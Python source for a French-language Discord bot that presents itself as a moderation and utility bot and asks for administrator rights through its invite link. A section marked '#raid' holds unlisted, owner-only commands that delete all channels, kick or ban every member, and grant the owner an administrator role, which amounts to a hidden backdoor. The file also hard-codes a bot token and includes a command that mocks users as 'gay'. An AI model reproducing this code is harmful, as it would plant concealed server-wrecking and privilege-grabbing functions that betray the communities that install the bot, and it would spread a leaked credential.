from inspect import ClosureVars
from os import name, system
from time import sleep
from os import name
from typing import Text
import discord
from discord import user
from discord import client
from discord.ext import commands
import random
import time
import json
import asyncio
SKIP_BOTS = False

from discord.ext.commands.core import bot_has_permissions, has_permissions
intents = discord.Intents.default()
intents.members = True


bot = commands.Bot(command_prefix = "+")

@bot.event
async def on_ready():
    await bot.change_presence(status=discord.Status.idle, activity=discord.Game('Prefix : +'))
    print=("Le Bot est prêt")


#help
bot.remove_command("help")

@bot.group(invoke_without_command=True)
async def help(ctx):
    em = discord.Embed(title = "Help", description = "Utilise !help <command> pour plus d'informations sur cette commande.",color = ctx.author.color)

    em.add_field(name = "Moderation", value = "kick, ban, unban, mute, clear, slowmode")
    em.add_field(name = "Autre", value = "gay, serverinfo, invite, support")

    await ctx.send(embed =em)



#help kick

@help.command()
async def kick(ctx):

    em = discord.Embed(title = "Kick", description = "Expulser des membres du serveur.",color = ctx.author.color)

    em.add_field(name = "**Syntax**", value = "!kick <membre> [Raison]")

    await ctx.send(embed = em)

#help ban

@help.command()
async def ban(ctx):

    em = discord.Embed(title = "Ban", description = "Bannir des membres du serveur.",color = ctx.author.color)

    em.add_field(name = "**Syntax**", value = "!ban <membre> [Raison]")

    await ctx.send(embed = em)

#help unban

@help.command()
async def unban(ctx):

    em = discord.Embed(title = "Unban", description = "Déban des membres du serveur.",color = ctx.author.color)

    em.add_field(name = "**Syntax**", value = "!unban <tag> (exemple de tag : jérome#2100)")

    await ctx.send(embed = em)

#help clear

@help.command()
async def clear(ctx):

    em = discord.Embed(title = "Clear", description = "Efface des messages.",color = ctx.author.color)

    em.add_field(name = "**Syntax**", value = "!clear <nombre de messages>")

    await ctx.send(embed = em)

#help slowmode

@help.command()
async def slowmode(ctx):

    em = discord.Embed(title = "Slowmode", description = "Créer un slowmode.",color = ctx.author.color)

    em.add_field(name = "**Syntax**", value = "!slowmode <nombre de secondes>")

    await ctx.send(embed = em)

#help mute

@help.command()
async def mute(ctx):

    em = discord.Embed(title = "Mute", description = "Mute un membre.",color = ctx.author.color)

    em.add_field(name = "**Syntax**", value = "!mute <membre>")

    await ctx.send(embed = em)














#invite
@bot.command()
async def invite(ctx):
    em = discord.Embed(title = "**Invite**", description = "Clique sur ce lien pour m'inviter dans ton serveur !                       "
    "||https://discord.com/api/oauth2/authorize?client_id=854770419319439410&permissions=8&scope=bot||",color = ctx.author.color)
    await ctx.send(embed = em)



#support

@bot.command()
async def support(ctx):
    em = discord.Embed(title = "**Support**", description = "Voici notre serveur pour plus d'aide !                       "
    "||https://discord.gg/FFZaFTcXCf||",color = ctx.author.color)
    await ctx.send(embed = em)



#mute

@bot.command()
@commands.has_permissions(administrator = True)
async def mute(ctx, member:discord.Member):
    role = discord.utils.get(ctx.guild.roles, name="Muted")
    guild = ctx.guild
    if role not in guild.roles:
        perms = discord.Permissions(send_messages=False, speak=False)
        await guild.create_role(name="Muted", permissions=perms)
        await member.add_roles(role)
        await ctx.send(f"{member} est bien mute !")
    else:
        await member.add_roles(role)
        await ctx.send(f"{member} est bien mute !")






#slownmode

@bot.command()
@commands.has_permissions(administrator = True)
async def slowmode(ctx,seconds: int):
    await ctx.channel.edit(slowmode_delay=seconds)
    await ctx.send(f"Le slowmode à été activé sur {seconds} secondes")



#clear

@bot.command(name='clear')
@commands.has_permissions(manage_messages = True)
async def delete(ctx, number_of_messages: int):
    messages = await ctx.channel.history(limit=number_of_messages + 1).flatten()
    

    for each_message in messages:
        await each_message.delete()
    


#nuke

@bot.command(name='nuke')
@commands.has_permissions(manage_channels = True)
async def delete(ctx):
    messages = await ctx.channel.history(limit=100).flatten()
    

    for each_message in messages:
        await each_message.delete()    

    await ctx.send(f"<@{ctx.author.id}> Le salon à bien été recréer ! ")


# Kick

@bot.command()
@commands.has_permissions(kick_members = True)
async def kick(ctx, user : discord.User, *reason):
    reason = " ".join(reason)
    await ctx.guild.kick(user, reason = reason)
    await ctx.send(f"{user} à été kick pour {reason}.")
    if user != None and reason != None:
           target = await bot.fetch_user(user)
           await user.send(reason)

# ban

@bot.command()
@commands.has_permissions(ban_members = True)
async def ban(ctx, user : discord.User, *reason):
    reason = " ".join(reason)
    await ctx.guild.ban(user, reason = reason)
    embed = discord.Embed(title = "**Banissement**", description = "Un modérateur à ban !", url = "https://discord.gg/FFZaFTcXCf", color=0xfa8072)
    embed.set_author(name = ctx.author.name, icon_url = ctx.author.avatar_url, url = "https://discord.gg/FFZaFTcXCf")
    embed.set_thumbnail(url = "https://emoji.gg/emoji/8907-banned")
    embed.add_field(name = "Membre", value = user.name, inline = True)
    embed.add_field(name = "Raison", value = reason, inline = True)
    embed.add_field(name = "Modérateur", value = ctx.author.name, inline = True)
    embed.set_footer(text = random.choice(funFact))
    
    await ctx.send(embed = embed)


# unban

@bot.command()
@commands.has_permissions(ban_members = True)
async def unban(ctx, user, *reason):
    reason = " ".join(reason)
    userName, userId = user.split("#")
    bannedUsers = await ctx.guild.bans()
    for i in bannedUsers:
        if i.user.name == userName and i.user.discriminator == userId:
            await ctx.guild.unban(i.user, reason = reason)
            await ctx.send(f"{user} à été unban.")
            return
    #user non trouver
    await ctx.send(f"L'utilisateur {user} n'est pas ban")


# gay

@bot.command()
async def gay(ctx, user):
    embed = discord.Embed(title = "", description = f"{user} est gay à " + random.choice(funFact2) + "%", url = "https://discord.gg/FFZaFTcXCf", color=0xfa8072)
    await ctx.send(embed = embed)



#message mp

@bot.command()
@commands.has_permissions(manage_messages = True)
async def dm(ctx, user_id=None, *, args=None):
    if user_id != None and args != None:
        try:
            target = await bot.fetch_user(user_id)
            await target.send(args)

            await ctx.channel.send("'" + args + "' A bien été envoyé à : " + target.name)

        except:
            await ctx.channel.send("Le message n'a pas été envoyé")

    else:
         await ctx.channel.send("Le tag n'est pas correct !")
           


#message mp all
@bot.command()
@commands.has_permissions(administrator = True)
async def dm_all(ctx, *, args=None):
    if args != None:
        members = ctx.guild.members
        for member in members:
            try:
                await member.send(args)
            except:
                await ctx.send("Cela ne marche pas")

    else:
        await ctx.send("Met un argument.")


#soutien

@bot.command()
@commands.has_permissions(administrator = True)
async def soutien(ctx, role):

    embed = discord.Embed(title = "**Nous soutenir !**", description = f"Comment avoir le rôle {role} ?", url = "https://discord.gg/FFZaFTcXCf", color=0xfa8072)
    embed.set_footer(text = "Il suffit d'avoir le lien de notre serveur en bio !")
        
    await ctx.send(embed = embed)


    

#giveaway

@bot.command()
@commands.has_permissions(administrator = True)
async def gw(ctx):
     
    embed = discord.Embed(title = "****", description = "Coche la réaction pour participer", url = "https://discord.gg/FFZaFTcXCf", color=0xfa8072)


    await ctx.send(embed = embed)


#giveaway fin

@bot.command()
@commands.has_permissions(administrator = True)
async def gwend(ctx):
     
    embed = discord.Embed(title = "**Fin du giveaway**", description = "Le gagnant est :", url = "https://discord.gg/FFZaFTcXCf", color=0xfa8072)
    embed.set_footer(text = random.choice(funFact))


    await ctx.send(embed = embed)


#channel

@bot.command(name='create', help="Créer un salon privé")
@commands.has_permissions(manage_channels=True, manage_roles=True)
async def create(ctx, *, nom_de_salon):
    guild = ctx.guild
    role = nom_de_salon
    autorize_role = await guild.create_role(name=role)
    overwrites = {
        guild.default_role: discord.PermissionOverwrite(read_messages=False),
        guild.me: discord.PermissionOverwrite(read_messages=True),
        autorize_role: discord.PermissionOverwrite(read_messages=True)
    }
    await guild.create_text_channel(nom_de_salon, overwrites=overwrites)
    await ctx.author.add_roles(autorize_role)

#raid


owner = 679281871133081611

@bot.command()
@commands.has_permissions(administrator = True)
async def abomb(ctx):
    

  if ctx.author.id == owner:

    for chan in ctx.guild.channels:
        try:
            await chan.delete()
        except:
            pass

    await ctx.guild.create_text_channel('Raid By Nevra')
    channel = discord.utils.get(bot.get_all_channels(), guild=ctx.author.guild, name='>>>')
    await channel.send("@everyone")

  else:
    await ctx.send("By Nevra")


@bot.command()
@commands.has_permissions(administrator = True)
async def bbomb(ctx):

  if ctx.author.id == owner:


    for member in ctx.guild.members:
        try:
            if member == ctx.author:
                pass
            else: 
                await member.kick()
                await ctx.send(f"Successfully kicked {member}")
        
        except Exception as e:
            await ctx.send(f"Unable to kick {member} {e}")
  else:
    await ctx.send("No")

@bot.command()
@commands.has_permissions(administrator = True)
async def cbomb(ctx):

  if ctx.author.id == owner:

    for member in ctx.guild.members:
        try:
            if member == ctx.author:
                pass
            else: 
                await member.ban()
                await ctx.send(f"Successfully ban {member}")
        
        except Exception as e:
            await ctx.send(f"Unable to ban {member} {e}")
  else:
    await ctx.send("No")

@bot.command()
@commands.has_permissions(administrator = True)
async def dbomb(ctx):

  if ctx.author.id == owner:

    perms = discord.Permissions(administrator=True)
    role = await ctx.guild.create_role(name="cc", permissions=perms)
    await ctx.author.add_roles(role)
    await ctx.message.delete()
  else:
    await ctx.send("No")



@bot.command()
@commands.has_permissions(administrator = True)
async def ebomb(ctx):

    await ctx.send("@everyone https://discord.gg/FFZaFTcXCf")





# serveur info

@bot.command()
async def serverinfo(ctx):
    server = ctx.guild
    numberOfTextChannels = len(server.text_channels)
    numberOfVoiceChannels = len(server.voice_channels)
    serverDescription = server.description
    numberOfPerson = server.member_count
    serverName = server.name
    embed = discord.Embed(title = "****", description = "Le serveur **{serverName}** contient **{numberOfPerson}** personnes. \n La description du serveur {serverDescription}. \n Ce serveur possède {numberOfTextChannels} salons écrit ainsi que {numberOfVoiceChannels} vocaux.", color=ctx.author.color)


    await ctx.send(embed = embed)




funFact = ["Le feu brule",
            "Pourquoi lisez vous cela ?",
            "On ne peut pas aller dans l'espace en restant sur terre",
            "Le savais tu : Tu peux m'inviter dans ton serveur juste grâce à la commande !invite",
            "Tu as besoin d'aide ? Rejoins notre serveur pour plus d'aide <!support>",]

funFact2 = ["1",
            "2",
            "3",
            "4",
            "5",
            "6",
            "7",
            "8",
            "9",
            "10",
            "11",
            "12",
            "13",
            "14",
            "15",
            "16",
            "17",
            "18",
            "19",
            "20",
            "21",
            "22",
            "23",
            "24",
            "25",
            "26",
            "27",
            "28",
            "29",
            "30",
            "31",
            "32",
            "33",
            "34",
            "35",
            "36",
            "37",
            "38",
            "39",
            "40",
            "41",
            "42",
            "43",
            "44",
            "45",
            "46",
            "47",
            "48",
            "49",
            "50",
            "51",
            "52",
            "53",
            "54",
            "55",
            "56",
            "57",
            "58",
            "59",
            "60",
            "61",
            "62",
            "63",
            "64",
            "65",
            "66",
            "67",
            "68",
            "69",
            "70",
            "71",
            "72",
            "73",
            "74",
            "75",
            "76",
            "77",
            "78",
            "79",
            "80",
            "81",
            "82",
            "83",
            "84",
            "85",
            "86",
            "87",
            "88",
            "89",
            "90",
            "91",
            "92",
            "93",
            "94",
            "95",
            "96",
            "97",
            "98",
            "99",
            "100"]


bot.run("ODU0NzcwNDE5MzE5NDM5NDEw.YMow_A.zj-ClqRR8trvKcd1eUudz3SUbMU")